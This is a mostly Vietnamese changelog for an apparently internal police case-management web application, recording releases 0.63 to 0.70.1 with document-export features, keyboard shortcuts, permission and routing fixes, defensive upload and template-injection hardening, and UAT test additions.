# Changelog

All notable changes to this project will be documented in this file.

## [0.70.1.0] - 2026-07-20

### Changed
- **Cập nhật CẢ 7 mẫu chứng từ Đơn thư theo bản chính thức PC01** (TT 128/2025/TT-BCA): Phiếu đề xuất, Phiếu chuyển nguồn tin (Mẫu 03), Phiếu chuyển đơn, Thông báo chuyển đơn, Thông báo hướng dẫn, Thông báo trả lại đơn, Giấy biên nhận (Mẫu 214). Giữ NGUYÊN bố cục/font/bảng chữ ký của bản PC01; dữ liệu điền tự động từ hồ sơ.
- `REQUIRED_BY_DOCTYPE` khớp biểu mẫu mới: PC01 chuẩn hoá lý do chuyển/căn cứ pháp lý thành văn cố định → trường bắt buộc chuyển sang **đơn vị nhận chuyển** (`donViNhan`) và **nhận định** (`nhanThay`).

### Added
- Field-catalog Đơn thư **+11 biến** (không cần migration — cột đã có sẵn): `soCCCD`, `ngayCapCCCD`, `noiCapCCCD`, `gioTiepNhan`, `ngayNhanNgan`, `ngayDonNgan`, `donViNhan`, `vietTatCanBo` (viết tắt cán bộ tạo, dòng "Lưu:"), `chucVuCanBo`, `coQuan`, `noiTiepNhan`.
- `tools/docx-templatize/` — bộ tách file nhiều chứng từ + thay dữ liệu mẫu bằng placeholder ở mức run (giữ nguyên định dạng Word), kèm `verify.mjs` chặn sót placeholder/lộ dữ liệu mẫu. Dùng lại khi PC01 phát hành biểu mẫu mới.
- `SEED_TEMPLATES_FORCE_FILE=1` — chế độ opt-in đẩy file mẫu mới vào môi trường ĐÃ seed (mặc định vẫn create-if-absent, không đè bản admin tự sửa).

### Fixed
- Giấy biên nhận không còn **bịa giờ tiếp nhận**: `receivedDate` nhập dạng ngày nên phần giờ luôn 00:00 (và lệch timezone máy chủ) — nay giữ khung "…… giờ ……" như bản giấy để điền tay, chỉ in giờ khi hồ sơ có giờ thật.

## [0.70.0.3] - 2026-07-18

### Added
- **Gợi ý phím tắt trên màn hình**: chip "⌨ Phím tắt (?)" luôn hiện ở header (chỉ desktop) mở bảng cheat-sheet; `<kbd>` phím tắt cạnh nút Tạo mới/Lưu/Hủy; `formatBinding` hiển thị đẹp (Shift+/ → ?, mũi tên); toggle bật/tắt gợi ý tại Settings → Phím tắt (mặc định BẬT, lưu per-thiết-bị).
- **Phím "Lỗi tiếp theo" (Shift+Enter)**: đăng ký vào registry (hiện trong cheat-sheet + Settings, rebind được); hook chung `useFormErrorNavigation` cho CẢ 3 form (Đơn thư/Vụ việc/Vụ án) — focus ô lỗi đầu khi lưu chưa hợp lệ + nhảy tới ô lỗi kế.

### Fixed
- Phím `?` đóng được bảng cheat-sheet khi đang mở (trước bị guard "modal đang mở" của useShortcut nuốt).

## [0.70.0.2] - 2026-07-18

### Changed
- **Phím tắt Thêm mới quay lại `Alt+N`** (revert F6 ở 0.70.0.1): F6 focus thanh địa chỉ của trình duyệt nên không ổn định; Alt+N là modifier không xung đột phím trình duyệt và vẫn `fireInInputs` (chạy cả khi con trỏ trong ô tìm kiếm/lọc).

## [0.70.0.1] - 2026-07-18

### Fixed
- **Phân quyền OFFICER lưu hồ sơ**: role OFFICER được cấp `write/edit/delete` cho Đơn thư/Vụ việc/Vụ án trong `seed.ts` (trước đây chỉ `read` do seed cấp quyền ghi chưa từng chạy trên prod → 15/18 cán bộ không lưu được đơn thư, PermissionsGuard 403). Đã grant trực tiếp trên prod. DataScope vẫn giới hạn ghi trong phạm vi tổ/ĐTV; `restore` giữ riêng ADMIN.

### Changed
- **Phím tắt Thêm mới**: đổi mặc định `Alt+N` → `F6` (đồng bộ nhóm F-key F2/F3/F4/F8; tránh F12/F5/F11 do trình duyệt giữ cho DevTools/Reload/Fullscreen). Đổi lại được tại Settings → Phím tắt.

## [0.70.0.0] - 2026-07-18

### Added
- **Đơn thư — Đơn vị tiếp nhận/xử lý theo danh mục + thẩm quyền**: danh mục `DON_VI` (Directory) quản lý tại `/danh-muc`; "Đơn vị tiếp nhận" nạp từ danh mục (bỏ trống = PC02); ô "Đơn vị xử lý" + checkbox "thuộc thẩm quyền" (check → Tổ/Nhóm, uncheck → danh mục). Petition +2 cột `thuocThamQuyen`, `donViXuLy` (migration `20260717000100`).
- **Phím tắt toàn hệ thống** (mở rộng hạ tầng v0.13.7.0): mặc định F2 Lưu / F3 Xóa (gate theo trạng thái) / F4 In chứng từ Word / Esc Hủy trên form nhập liệu; Alt+N thêm mới / Alt+R làm mới / Ctrl+K tìm kiếm trên danh sách; F8 làm mới/nhập lại form. Tất cả `fireInInputs` (chạy cả khi con trỏ trong ô nhập); user tự cấu hình tại Settings → Phím tắt.
- **Bộ tạo clip hướng dẫn** `tools/guide-recorder/` (Playwright + ffmpeg-static + msedge-tts) sinh trang HDSD HTML + 18 clip MP4 lồng tiếng Việt + phụ đề (sản phẩm xuất ra `C:\PC02\docs`, ngoài repo).

### Changed
- Form đăng ký đơn thư: tự điền Ngày tiếp nhận nguồn tin/Ngày đề xuất theo Ngày tiếp nhận; ẩn ô Tóm tắt (tự lấy từ Nội dung), đổi nhãn "Nội dung chi tiết" → "Nội dung"; lưu lỗi → focus field lỗi đầu, Shift+Enter nhảy field lỗi kế.

### Fixed
- Phím tắt list/form bị nuốt khi con trỏ trong ô nhập (thiếu `fireInInputs`). F3 xóa trên form nay tuân rule trạng thái (chỉ TIEP_NHAN cho vụ án/vụ việc). F8 reset an toàn (không ghi đè bản ghi khi Sửa). ConvertPetitionModal thêm `role="dialog"`.

## [0.69.0.2] - 2026-06-29

### Added
- **In đồng loạt chứng từ — báo số đơn thành công/thất bại**: trước đây "in đồng loạt" báo thành công chung chung dù vài đơn thiếu thông tin bắt buộc (ghi `ok:false` trong `manifest.json` nhưng FE không đọc). Nay backend trả header `X-Batch-Total`/`X-Batch-Ok`/`X-Batch-Failed` (+ `exposedHeaders` CORS để FE đọc cross-origin, fix luôn `Content-Disposition` chưa expose); FE (danh sách Đơn thư + Xuất báo cáo) báo "Đã xuất X/Y đơn, Z đơn thiếu thông tin bắt buộc (xem manifest.json trong file ZIP)". Chi tiết per-đơn vẫn nằm trong `manifest.json` của file ZIP.

## [0.69.0.1] - 2026-06-28

### Fixed
- **Mẫu chứng từ động — menu admin bị ẩn (không xuất được chứng từ)**: Module `document-templates` thiếu `feature.manifest.ts` backend → không nằm trong `FEATURE_REGISTRY` → `db:seed:features` không tạo flag `document-templates` → `useFeature` trả `false` → menu "Quản lý mẫu chứng từ" ẩn → admin không vào được trang tải mẫu → 0 mẫu → nút "Lưu và xuất file"/"In chứng từ" mở popup trống, không xuất được. Fix: thêm backend manifest + wire vào registry; chạy `db:seed:features` (hoặc seed sẵn flag) để menu hiển thị. Route `/settings/document-templates` không bị gate nên vẫn vào thẳng URL được trong lúc chờ. + test regression luồng "Lưu và xuất file" với modal thật.

## [0.69.0.0] - 2026-06-28

### Added
- **Xuất chứng từ ĐỘNG cho Vụ việc & Vụ án**: Admin tải mẫu `.docx` lên (trang Cấu hình → Mẫu chứng từ, `/settings/document-templates`) khai báo loại hồ sơ (VU_AN/VU_VIEC/DON_THU), danh mục, cấp số văn bản (chọn chuỗi số) và thứ tự. Mẫu lưu trong DB (`document_templates`). Cán bộ xuất chứng từ ngay trên form Vụ án/Vụ việc qua split-button **"Lưu và xuất file"** hoặc nút **"In chứng từ"** độc lập (edit mode) → popup chọn mẫu (nhóm theo danh mục, tick sẵn) + form nhập tay cho biến ngoài danh mục → **Gộp 1 file Word** hoặc **Tách – ZIP**. Endpoints: `POST /cases|incidents/:id/export-documents`, `GET /cases|incidents/export-templates` (quyền read Case/Incident — điều tra viên dùng được mà không cần quyền Setting), CRUD `/document-templates` (quyền Setting/admin).
- **Đồng bộ Đơn thư**: Thêm nút **"In chứng từ"** độc lập trên chi tiết đơn thư (mở popup 7 mẫu hardcode mà không cần lưu lại) — parity 3 module.
- **Catalog biến chuẩn + biến nhập tay**: Biến phát hiện trong `.docx` được phân loại tự động — thuộc danh mục chuẩn (mã/tên/ngày... của Case/Incident) thì tự điền từ hồ sơ; ngoài danh mục thì yêu cầu nhập tay khi in (tránh placeholder rỗng câm trong file).
- **Atomic cấp số (no-gap)**: Render + cấp số văn bản + gộp/zip chạy trong MỘT transaction với row-lock chống cấp số trùng khi xuất song song; lỗi bất kỳ rollback hết, không tiêu số.
- **UAT**: Bộ 129 test case (`docs/uat/export-chung-tu-dong/`, Excel + Markdown) + Playwright API smoke `tests/api/export-chung-tu-dong-uat.api.spec.ts` (41/41 PASS).

### Security
- **Phân quyền xuất chứng từ**: DataScope chặn điều tra viên xuất hồ sơ ngoài phạm vi tổ (403). Escape token docxtemplater (`{ } < >`) trong mọi giá trị (kể cả biến nhập tay) chống template-injection. Upload chỉ nhận `.docx` ≤5MB + kiểm tra zip hợp lệ (`word/document.xml`) chống MIME-spoof.

### Fixed
- **Mẫu cấp số phải chọn chuỗi số**: Form thêm mẫu yêu cầu `numberSeriesId` khi bật "Cấp số văn bản"; backend chặn `needsNumber` thiếu series — tránh mẫu cấu hình sai luôn lỗi 400 khi in.
- **Mã mẫu trùng**: Tạo mẫu trùng mã (cùng loại hồ sơ) trả 409 thân thiện thay vì lỗi kỹ thuật.

## [0.68.1.0] - 2026-06-27

### Added
- **Đơn thư — Popup "Xuất chứng từ" + split-button Lưu**: Nút "Lưu đơn thư" trên form đơn thư nay là split-button — phần chính giữ hành vi cũ (lưu → về danh sách); caret ▼ mở menu "Lưu đơn thư" / "Lưu và xuất file". Chọn "Lưu và xuất file" → lưu đơn → mở popup chọn nhiều mẫu chứng từ (7 mẫu, mặc định tick hết) với 2 định dạng: **Gộp 1 file Word** (mặc định, ngắt trang giữa các mẫu) hoặc **Tách – ZIP** (mỗi mẫu 1 file). Endpoint mới `POST /petitions/:id/export-documents`.
- **Atomic xuất nhiều mẫu**: Toàn bộ render + cấp số văn bản + gộp/zip chạy trong MỘT transaction — bất kỳ lỗi nào (thiếu trường, gộp, zip) rollback hết, KHÔNG tiêu số văn bản (không gap số). Pre-validate tất cả mẫu trước khi cấp số.

## [0.67.6.0] - 2026-06-01

### Fixed
- **Documents — Enter key trong form upload không còn submit outer form**: Nhấn Enter khi đang nhập Tiêu đề hoặc Mô tả tài liệu trong `EntityDocumentsTab` không còn trigger `<form onSubmit>` của `PetitionFormPage` / `IncidentFormPage`, ngăn redirect về màn hình danh sách trước khi user kịp chọn file. Fix: thêm `onKeyDown e.preventDefault()` vào cả hai text input.
- **Documents — Nút "Tải lên tài liệu" ẩn khi chưa có entity ID**: Trong create mode (chưa lưu đơn/vụ việc), button "Tải lên tài liệu" bị ẩn thay vì hiện rồi báo lỗi. Giảm confusion cho người dùng.

### Changed
- **Đơn thư & Vụ việc — Section tài liệu luôn hiển thị**: `EntityDocumentsTab` nay render ngay cả khi tạo mới (create mode). Người dùng thấy section tài liệu kèm thông báo "Lưu [đơn/vụ việc] trước để tải lên tài liệu" — không còn bị ẩn hoàn toàn. Sau khi lưu, section tự động unlock với đầy đủ chức năng.
- **Ủy thác điều tra — Mã số UTDT**: Hồ sơ ủy thác điều tra (caseProvenance = UY_THAC_DIEU_TRA) sử dụng document type `UTDT` (format `UTDT-YYYY-NNNNN`, counter riêng) thay vì type `CASE`. Label "Mã hồ sơ" đổi thành "Số ủy thác" trên form tạo UTDT.

## [0.67.5.1] - 2026-05-31

### Fixed
- **Documents — Tải tài liệu trong Vụ việc & Đơn thư**: Click vào button tải xuống / tải lên / xóa tài liệu không còn tự redirect về màn hình danh sách. Nguyên nhân: `<button>` không có `type=button` mặc định là `type=submit` trong HTML — khi `EntityDocumentsTab` được nhúng vào `<form>` của `IncidentFormPage` và `PetitionFormPage`, click bất kỳ button nào trigger form submit. Fix: thêm `type="button"` vào cả 6 interactive buttons trong `EntityDocumentsTab`.

## [0.67.5.0] - 2026-05-31

### Fixed
- **UTDT — Vị trí cột Thao tác**: Di chuyển cột Eye/Pencil/Trash lên ngay sau cột checkbox — nhất quán với Cases, Incidents, Petitions (pattern chuẩn của project).

## [0.67.4.0] - 2026-05-31

### Added
- **UTDT — Bulk selection**: `UyThacDieuTraListPage` nay có checkbox đầu bảng + `BulkActionBar` sticky-bottom — nhất quán với Cases/Incidents/Petitions. Người dùng có thể chọn nhiều ủy thác để xóa hàng loạt thay vì xóa từng cái.

### Changed
- **UTDT — `trangThaiPhanHoi` trong API**: `GET /cases?caseType=UY_THAC_DIEU_TRA` và `POST/PATCH /cases` nay trả về trường `trangThaiPhanHoi` (computed: `CHUA_PHAN_HOI` | `DA_PHAN_HOI` | `KHONG_THUC_HIEN_DUOC` | `QUA_HAN`) trực tiếp trong response — frontend không cần tính lại phía client.
- **UAT spec**: Thêm `docs/uat/utdt/uat_uy_thac_dieu_tra.md` — 41 test case phủ GREEN/RED/EDGE/BOUNDARY/SECURITY/PERFORMANCE/UI_CONSISTENCY + 4 E2E journeys. Playwright spec mới: `tests/api/utdt-bugfix-uat.api.spec.ts` + `tests/e2e/utdt-bugfix-uat.e2e.spec.ts`.

### Fixed
- **UTDT — `donViGiao` validation**: Backend DTO nay enforce `@IsNotEmpty` + `@Transform(trim)` cho `donViGiao` khi `caseType=UY_THAC_DIEU_TRA` — bypass qua API trực tiếp không còn tạo được UTDT thiếu đơn vị giao.
- **UTDT — Stats cards stale sau bulk delete**: `refetchCounter` thêm vào deps của stats effect — stats strip tự refresh sau khi bulk operation thay vì giữ số cũ.
- **UTDT — Tab "Thông tin Ủy thác" ẩn khi click chỉnh sửa**: `RedirectToEdit` nay truyền `caseProvenance=UY_THAC_DIEU_TRA` qua URL — tab UTDT hiển thị ngay lập tức khi mở form sửa, không còn flash ẩn trong 300ms chờ API.
- **UTDT — Dropdown "Loại ủy thác" trống khi tạo mới**: `hydrateFormFromUrl` nay pre-fill `utdt_loaiUyThac=UY_THAC_DIEU_TRA` khi navigate từ entry path UTDT — user không cần tự chọn lại.

## [0.67.3.0] - 2026-05-31

### Changed
- **Toolbar.tsx**: layout 2-row khớp Kiến nghị VKS — Filter+Reset ở row trên, Search full-width ở row dưới. Thêm `hasRow1` guard loại bỏ dead space khi toolbar không có filter children
- **Table.tsx**: `displayCount` chỉ hiển thị khi `state === 'ready'` — tránh stale count trong loading state. Thêm `aria-labelledby` trên `<table>` khi `sectionTitle` có, loại bỏ duplicate sr-only caption
- **styles.ts**: `TABLE_SECTION_CARD` dùng `overflow-clip` thay `overflow-hidden` — sticky positioning của BulkSelectionHeaderCell hoạt động đúng trên Safari/Chrome
- **StatsCardsStrip.tsx**: import và dùng `STATS_CARD` constant từ `styles.ts` thay vì inline string

### Fixed
- **Toolbar**: khi `hasAdvancedFilters=false` và `showReset=false`, không còn render empty Row 1 gây ~16px dead space trước search input
- **Table**: section header count không còn hiện số cũ ("Hiển thị 20 / 47") khi table đang loading

## [0.67.2.0] - 2026-05-31

### Added
- **UAT spec generator** (`scripts/uat_spec_generator.py`): tự động inject request body từ `steps` field vào API test, giúp POST/PUT/PATCH tests gửi payload đúng thay vì body rỗng
- **System-wide UAT spec layer** (`tests/api/system-wide-uat.api.spec.ts` + `tests/e2e/system-wide-uat.e2e.spec.ts`): 29 test case mới gồm smoke tests, DataScope cross-team security (J08 — BLOCKER nếu fail), integration spot-checks, và UI/UX consistency checks xuyên 4 module
- **Kế hoạch UAT toàn hệ thống** (`docs/uat/uat_system_wide.md`): S1-S8 bao gồm bản đồ hệ thống, integration matrix, 12 user journeys, vòng đời dữ liệu, smoke test, sign-off gate
- **Design system constants**: `TABLE_SECTION_HEADER_*`, `TOOLBAR_CARD`, `TOOLBAR_STRIP` trong `styles.ts`

### Changed
- **E2E spec generator**: fix `.or().first()` → `.or(fallback).first()` — tránh Playwright strict mode violation khi cả 2 locator đều match, giảm E2E failures từ ~182 xuống ~20
- **API spec generator**: tests với path parameter placeholder (`:id`, `{id}`) nay emit `test.skip()` thay vì false-fail với HTTP 404, kết quả test suite trung thực hơn
- **Table.tsx**: lift `SectionHeader` ra module-level (tránh remount), thêm `StateCard` wrapper loại bỏ 6x DRY state branch
- **Toolbar.tsx**: dùng `TOOLBAR_CARD`/`TOOLBAR_STRIP` constants thay vì inline Tailwind strings
- **global-setup.ts**: guard với `UAT_PROD=1` để không login khi dev chạy local tests; xoá dead `userId` variable và dead `storageState` write

### Fixed
- **Credentials security**: `docs/uat/_shared/test-accounts.json` xoá plaintext passwords → dùng `password_env` references; file được gitignore; fallback defaults trong `global-setup.ts` không còn expose credentials trong source
- **`playwright.config.ts`**: xoá dead `extraHTTPHeaders` với `UAT_TOKEN` (luôn empty tại config evaluation time, trước khi globalSetup chạy)

## [0.67.1.0] - 2026-05-30

**v0.67.1 hotfix(petitions) — /investigate: click row trên /petitions redirect /login**

Anh báo click 1 row trong danh sách đơn thư → tự động chuyển sang trang
đăng nhập. /investigate found cùng class bug như v0.66.1 incidents:
PetitionListPageShell `onRowClick={(r) => navigate(\`/petitions/${r.id}\`)}`
navigate to `/petitions/:id` nhưng route đó KHÔNG tồn tại trong
`features/petitions/routes.tsx`. React Router fall-through to App.tsx
catch-all `<Route path="*" element={<Navigate to="/login" replace />} />`
→ user bị đẩy về login.

### Fix

Add `/petitions/:id` route alias rendering `PetitionFormPage`. Form đã handle
cả read+edit qua `useParams id` presence (line 65-66 of PetitionFormPage):
- `id` present → `isEditMode=true` → load record + render edit form
- `id` absent → create mode

Pattern matches Cases (`/cases/:id` exists separately) + Incidents (v0.66.1 fix).

### Tests
- tsc clean.
- Route addition is config-only; no new unit tests needed.

## [0.67.0.0] - 2026-05-30

**v0.67 PR2-bis — Restore 2 deferred Incidents actions: Chuyển trạng thái + Khởi tố**

Workflow nghiệp vụ chính BLTTHS: Vụ việc → (Khởi tố) → Vụ án, hoặc Vụ việc → (Chuyển trạng thái) → Không khởi tố / Tạm đình chỉ / etc.

Plan v3 (/autoplan + /plan-eng-review) chốt 5 issues 10/10. PR này ship PR1 (Incidents 2 actions). PR3-bis (Petitions 3 actions) sẽ ship v0.68.

### Added

**Backend codegen INCIDENT_VALID_TRANSITIONS** (T1, Issue I1):
- `backend/scripts/generate-shared-enums.cjs` extended với `extractValidTransitions()` + `emitTransitionsTypeScript()` helpers.
- Output: `frontend/src/shared/enums/incident-transitions.generated.ts` — single source of truth for state machine. 0 round-trip cost vs API endpoint approach.
- 5 node:test cases for parser.

**`useModalLifecycle<TArgs, TResult, TPayload>` hook** (T2, Issue I4):
- Generic state machine (idle/open/loading/error/success) shared by 7 modal providers.
- Eliminates ~30 LOC boilerplate per provider. ~150 LOC saved across PR1+PR2.
- 8 unit tests.

**`<CompositeModalProvider>`** (T3, Issue I2):
- Single component wrapping 4 inner modal providers (Assign + Delete + StatusTransition + Prosecute). App.tsx simplified from 4 nested to 1 mount.
- 2 unit tests.

**`<StatusTransitionModalProvider>` + `useStatusTransitionModal()`** (T4):
- Modal cho Chuyển trạng thái Vụ việc (Điều 144 + 157 BLTTHS).
- Dropdown filtered by `INCIDENT_VALID_TRANSITIONS[currentStatus]` (codegen).
- Conditional `lyDoKhongKhoiTo` field khi chọn KHONG_KHOI_TO.
- Note textarea (optional).
- PATCH `/incidents/:id/status` với optimistic lock.
- 7 unit tests.

**`<ProsecuteModalProvider>` + `useProsecuteModal()`** (T5):
- Modal cho Khởi tố Vụ việc → Vụ án mới.
- Banner cảnh báo + 4 fields (caseName pre-fill, prosecutionDecision, prosecutionDate, crime).
- POST `/incidents/:id/prosecute` atomic transaction.
- onSuccess callback receives `newCaseId` for navigation.
- 7 unit tests.

**ActionContext extension** (T6):
- Optional `statusTransition` + `prosecute` openers.
- `incidentsRowActions` registers 2 new menu actions với visibility guards:
  - Transition: visible khi provider + `INCIDENT_VALID_TRANSITIONS[status]` non-empty
  - Prosecute: visible khi provider + status ∈ {DANG_XAC_MINH, DA_PHAN_CONG}
- 4 new registration tests.

**IncidentListPageShell wired** (T7):
- ActionContext exposes statusTransition + prosecute modal openers.
- Prosecute onSuccess → navigate `/cases/:newCaseId`.
- Test setup migrated to `<CompositeModalProvider>` wrapper.

### Changed

- `App.tsx`: 2 modal provider imports → 1 CompositeModalProvider import. 4 nested JSX → 1 mount.
- 3 test files (Cases/Petitions/Comprehensive) still use legacy nested providers — works because providers exported individually. Will migrate to CompositeModalProvider in PR2 v0.68.

### Tests

- Total 1195/1196 frontend tests pass (1 known-flaky PetitionFormPage.payload from prior version).
- tsc strict clean (frontend + backend).
- 26 new unit + 4 new registration tests (T1+T2+T4+T5+T6 = 30 new).

### Deferred

- Playwright E2E suite (Issue I5 chosen 10/10) deferred to PR1-bis. Unit + integration test coverage is solid; production QA + browser snapshot will verify Khởi tố flow end-to-end.

## [0.66.2.0] - 2026-05-30

**v0.66.2 hotfix(doc-numbers) — Lưu vụ việc lỗi 500 Internal server error**

Anh báo bấm "Lưu vụ việc" → "Vui lòng kiểm tra: Internal server error".
Backend logs cho thấy `PrismaClientKnownRequestError: Unique constraint failed
on the fields: (code)` trên `incidents.create()`.

### Root cause

`document_number_counters` table tracks next available counter per
documentType+period. `commitWithTx` locks row + reads currentValue + increments.
Counter starts at 0, increments to 124. Form pre-fill shows VV-2026-00125.

But `prisma/seed-sample-data.ts` inserts seed incidents (VV-2026-001 …
VV-2026-005) DIRECTLY via Prisma without going through commitWithTx →
counter stays at 0 while DB has codes up to VV-2026-00145. Save attempts
generate code 125 → unique constraint conflict.

### Hot-fix (immediate, on prod DB)

Manual SQL: `UPDATE document_number_counters SET "currentValue" = 145 ...`
where MAX(code suffix) = 145. Form preview now shows VV-2026-00146. Verified
save works end-to-end: created "Test save sau hotfix counter" successfully.

### Code defensive fix (this PR)

`commitWithTx` now detects counter drift before incrementing:
1. After locking counter row, query `MAX(suffix)` from target table (`incidents`
   for INCIDENT, `cases` for CASE) using period prefix (`%-YYYY-%`).
2. If DB max ≥ counter+1, bump `nextValue` to `dbMax + 1`.
3. Counter row then updated to `nextValue` so subsequent calls are consistent.

Pattern hard-coded for INCIDENT + CASE document types. New types using docNums
counters need to add a branch (mặc dù em recommend always go through
commitWithTx for new entities, including seeds).

### Tests

- 26 unit tests pass (1 new: "drift fix bumps nextValue past DB max").
- 2096/2096 backend test suite pass.
- tsc clean.

## [0.66.1.0] - 2026-05-30

**v0.66.1 hotfix(incidents) — /investigate: tạo mới vụ việc không được**

Anh báo /incidents/new render "Không thể tải thông tin vụ việc. Quay lại"
instead of mounting IncidentFormPage. /investigate found routing collision:
features/incidents/routes.tsx had `/incidents` + `/incidents/:id` aliases but
NO `/incidents/new` alias. `/incidents/new` matched `/incidents/:id` with
id="new" → IncidentDetailPage tried GET /api/v1/incidents/new → 404.

Fix: add `/incidents/new` (mounts IncidentFormPage) + `/incidents/:id/edit`
aliases mirroring existing `/vu-viec/*` routes.

Also resolves Edit button on /incidents shell (em chưa noticed but `/incidents/:id/edit`
was also missing).

Cases + Petitions routes already correct. Comprehensive uses `/comprehensive-list`
not `/comprehensive`, so unaffected.

## [0.66.0.0] - 2026-05-30

**v0.66 PR4 — Restore row actions + advanced filters trên /comprehensive (polyglot dispatch)**

Hoàn tất chuỗi PR1 (Cases v0.63) + PR2 (Incidents v0.64) + PR3 (Petitions v0.65)
+ PR4 (Comprehensive v0.66). 4 shells đầy đủ actions + filters per
docs/audit/shell-parity-matrix.md.

Comprehensive đặc biệt: rows polyglot (CASE | INCIDENT | PETITION). Actions
dispatch route + delete endpoint per `row.recordType`.

### Added

**Comprehensive per-row actions** (`features/comprehensive/row-actions.ts`):
- View → /{cases|incidents|petitions}/:id per recordType
- Edit → /{type}/:id/edit per recordType + canEdit guard
- Xóa → DeleteResourceModal with resourceType mapped from recordType

**Comprehensive advanced filters** (`features/comprehensive/list-filters.ts`):
- Từ ngày / Đến ngày (date)
- Quận/Huyện (text)
- Trạng thái (text, free-form vì 3 entity types có status enum khác nhau)
- Người tạo (text)

### Changed

- `ComprehensiveListPageShell.tsx`: Thao tác column FIRST, Filters as Toolbar
  accordion children, list fetch dep extended with appliedFilters,
  refetchCounter triggers refresh after delete success.

### Tests

- 10 registration unit (polyglot dispatch all 3 types) + 13 existing
  ComprehensiveListPageShell tests pass. tsc clean.

### Deferred

Convert-to-case / Convert-to-incident (Petition-specific) → PR3-bis if needed.
Petitions PR3 also deferred Archive action.

## [0.65.0.0] - 2026-05-30

(PR3 entry written in PR #151, will appear once that PR merges.)

## [0.64.0.0] - 2026-05-30

**v0.64 PR2 — Restore single-row actions + advanced filters trên /incidents**

Tiếp nối PR1 (v0.63 Cases): áp dụng cùng pattern typed registry + modal
providers cho IncidentListPageShell. Anh's complaint #1 + #2 resolved
trên Incidents.

### Added

**Incidents per-row actions** (`features/incidents/row-actions.ts`):
- View → `/vu-viec/:id`
- Edit → `/vu-viec/:id/edit`
- Phân công (UserCheck, canDispatch guard) → AssignModal(resourceType=incidents)
- Xóa (Trash2, TIEP_NHAN-only via canDelete predicate) → DeleteResourceModal

**Incidents advanced filters** (`features/incidents/list-filters.ts`):
- Từ khóa (text) — URL key `incidents_keyword`
- Loại nguồn tin (enumSelect: TO_GIAC | TIN_BAO | KIEN_NGHI_KHOI_TO) — URL key `incidents_loai_don_vu`
- Người tố giác/báo tin (text) — URL key `incidents_reporter`
- Đơn vị (text) — URL key `incidents_unit`

### Changed

- `IncidentListPageShell.tsx`:
  - Adds 'Thao tác' column FIRST (8rem width) rendering RowActions.
  - Passes <Filters> as children of <ListPageShell.Toolbar>.
  - List fetch dep extended with appliedFilters; spreads keyword/loaiDonVu/
    reporter/unit into /incidents GET params.
  - handleResetFilters clears advanced filter draft + URL.
  - activeFilterCount includes phase + status + search + N applied advanced.

### Tests

- 7 new registration tests + 19 existing IncidentListPageShell tests pass.
- Total: 1150 frontend tests (1149 pass + 1 known-flaky PetitionFormPage.payload).
- tsc --noEmit clean.

### Deferred to PR2-bis

- Chuyển trạng thái action (needs StatusTransitionModalProvider + form fields).
- Khởi tố action (needs ProsecuteModalProvider with form fields).

Both have backend API contracts; defer modal scaffolding to dedicated PR.
## [0.65.0.0] - 2026-05-30

**v0.65 PR3 — Restore single-row actions + advanced filters trên /petitions**

Tiếp nối PR1 (v0.63 Cases) + PR2 (v0.64 Incidents): cùng pattern typed
registry + provider cho PetitionListPageShell.

### Added

**Petitions per-row actions** (`features/petitions/row-actions.ts`):
- View → `/petitions/:id`
- Edit → `/petitions/:id/edit`
- Phân công (canDispatch) → AssignModal(resourceType=petitions)
- Xóa → DeleteResourceModal (no status guard for petitions)

**Petitions advanced filters** (`features/petitions/list-filters.ts`):
- Từ ngày / Đến ngày (date) — URL `petitions_from_date` / `petitions_to_date`
- Người gửi (text) — URL `petitions_sender`
- Trạng thái (enumSelect 7 PetitionStatus values) — URL `petitions_status`
- Đơn vị (text) — URL `petitions_unit`

### Changed

- `PetitionListPageShell.tsx`: Thao tác column FIRST, Filters as Toolbar
  accordion children, list fetch dep extended with appliedFilters,
  handleResetFilters clears advanced filter draft + URL.

### Tests

- 8 registration unit + 14 existing PetitionListPageShell tests pass.
- tsc clean.

### Deferred to PR3-bis

- Archive (lưu trữ), Convert-to-incident, Convert-to-case — need dedicated
  modal providers with form scaffolding.

## [0.63.0.0] - 2026-05-30

**v0.63 Restore single-row actions + advanced filters trên /cases — PR1b
(typed registry + modal providers)**

Anh báo production v0.61: trên /cases mất hết single-row actions ("chuyển đội",
"đình chỉ", ...) và bộ lọc nâng cao. Em audit (`docs/audit/shell-parity-matrix.md`)
phát hiện 39+ features mất qua F1+F7 swap trên 4 shells. v0.63 fix Cases first
(anh's primary complaint). PR1a (registry infra) + PR1b (Cases full restore)
ship cùng release.

CEO + Eng dual-voice review (Codex + Claude subagent) rejected per-page hook
pattern — chose typed factory registry + singleton modal providers + parity
audit gate. Decision audit trail in plan file.

### Added

**Typed row-action registry** (`features/_shared/row-actions/`):
- `createRowActionRegistry<TRow>()` — typed factory preserves row type
  through register/all calls.
- `commonResourceActions({basePath, canDelete, resourceType})` — View + Edit +
  optional Delete shared across 4+ resources. -150 LOC per registration.
- `<RowActions registry row ctx>` — smart component renders inline icon
  buttons + ⋮ MoreVertical kebab opening ActionMenuPortal with menu items.
- `ActionContext` threads navigate + perms + modal openers.

**Typed list-filter registry** (`features/_shared/list-filters/`):
- `createListFilterRegistry<TValue>()` + `FilterField<TValue>` types.
- `useListFilters({prefix, registry})` — draft + applied state, URL round-trip
  via URLSearchParams. apply/reset/hasUnappliedChanges.
- `<Filters registry value onChange onApply onReset>` — responsive 3-col
  grid (1-col mobile), Áp dụng + Xóa lọc buttons.

**Singleton modal providers** (`features/_shared/modals/`):
- `<AssignModalProvider>` + `useAssignModal()` — wraps existing AssignModal,
  mounted once at App root, opened imperatively from registry actions.
- `<DeleteResourceModalProvider>` + `useDeleteResourceModal()` — simple
  confirm dialog issuing DELETE /{resource}/{id}.

**Cases per-row actions registered** (`features/cases/row-actions.ts`):
- View (Eye) → /cases/:id
- Edit (Pencil) → /cases/:id/edit
- Phân công (UserCheck, canDispatch guard) → AssignModal
- Quản lý bị can (Users) → /cases/:id?tab=defendants
- Quản lý luật sư (Briefcase) → /cases/:id?tab=lawyers
- Kết luận điều tra (FileText) → /cases/:id?tab=conclusion
- Chuyển xử lý (ArrowRightLeft) → /transfer-return?caseId=:id
- Xóa (Trash2, TIEP_NHAN-only) → DeleteResourceModal

**Cases advanced filters registered** (`features/cases/list-filters.ts`):
- Từ ngày / Đến ngày (date) — URL key `cases_from_date` / `cases_to_date`
- Đơn vị (text) — URL key `cases_unit`
- Điều tra viên (text) — URL key `cases_investigator`
- Tội danh (text) — URL key `cases_charges`

**a11y patch on ActionMenuPortal**:
- Focus first [role=menuitem] child on portal open.
- ArrowDown/ArrowUp cycle through menuitems (wraps at ends).
- Return focus to anchor on close (Escape/click-outside).
- tabIndex=-1 on menu root for onKeyDown.

